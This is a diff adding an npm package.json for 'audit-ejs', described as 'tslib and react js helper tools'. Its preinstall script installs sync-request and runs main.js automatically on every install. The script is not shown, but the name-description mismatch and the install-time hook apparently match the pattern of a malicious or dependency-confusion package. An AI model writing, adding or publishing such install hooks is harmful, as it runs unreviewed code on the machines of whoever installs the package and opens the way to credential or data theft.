@@ -1,0 +1,15 @@
+{
+  "name": "audit-ejs",
+  "version": "1.7.2",
+  "description": "tslib and react js helper tools",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"[Error]: [-] no test script specified\" && exit 1",
+    "preinstall": "npm install sync-request && node main.js"
+  },
+  "author": "",
+  "license": "MIT",
+  "dependencies": {
+    "sync-request": "^6.1.0"
+  }
+}
